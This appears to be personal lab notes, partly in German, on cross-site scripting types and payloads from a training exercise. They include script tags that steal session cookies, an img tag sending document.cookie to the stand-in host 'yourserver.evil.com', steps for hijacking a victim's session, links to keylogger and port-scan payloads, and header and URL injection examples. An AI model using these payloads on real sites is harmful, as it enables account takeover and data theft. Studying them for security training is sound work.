- Stored / Persistent (Server-Side)
    - Runs when the Server loads the Side
    - if User Input is forwarded unfiltered to database
    - if User Input can be executes as javascript (e.g. "Add a comment" / Blog Posts)
-   Reflected (Client Side)
    - Target includes the Payload from Attacker in Response. Target has to open a specific URL to execute the HackerSoftware
-   DOM-Based (Special)
    -   Document Object Model - erlaubt das Ändern der HTML Dokument Struktur
    - Document Object Model - allows to change the HTML Document Structur
    - mostly uses the `<script></script>` Tag

XSS Payloads Examples:

```
<script>alert(“Hello World”)</script>

<script>alert(window.location.hostname)</script>

<script>document.querySelector('#thm-title').textContent = "I am a hacker"</script>

document.write(my Stuff, e.g. a Link)

XSS Keylogger http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html

Port scanning http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html
```


Cookies Logging and using Example:

```
We have made things easy for you. Requesting /log/hello will log hello for you.

The logs page will show you everything logged to /log/any_text URL.

This means, if you write a malicious script to steal someones cookie, you can have it logged for you to take over their account

Posting <script>document.location='/log/'+document.cookie</script> will log everyones cookies. Make sure its not your cookie when you're visiting the logs page as you will have also visited this page again.. You can check this by looking at your cookies in the Developer Tools console and executing document.cookie.

Once your victim (in this case you hope its Jack), to visit this page, it will log his cookie for you to steal! You can also use other HTML tags to make requests, including the img tag:

<img src="https://yourserver.evil.com/collect.gif?cookie=' + document.cookie + '" />

Now you have Jacks cookie, you can update your own by replacing its value. You can update your own cookies value in your Developers Tools. (developer Tools - Application - Cookies - connect.sid = value

Once you've replaced your cookie with Jacks, refresh your page and see who you are logged in as!
```




## DOM Based

XFS - Cross Frame Scripting, e.g. in Search Bar

`<iframe src="javascript:alert('xss')">`



## Persistent

-  In [Burp Suite](Burp%20Suite): Intercept On
- On Webseite: Log Out
- In Burp Suite: Request Headers - add
    - Name: True-Client-IP (similar to X-Forwarded-For header) (ist ähnlich zu X-Forwarded-For header, if header is not cleaned)
    -   Value: `<iframe src="javascript:alert('xss')">`




## Reflected

e.g. there is `?id=` in the URL, you can change the ID to Code and Reload the site

Example:

```
http://10.10.207.191/#/track-result?id=5267-9d92cb802200b213
http://10.10.207.191/#/track-result?id=<iframe src="javascript:alert(`xss`)">
```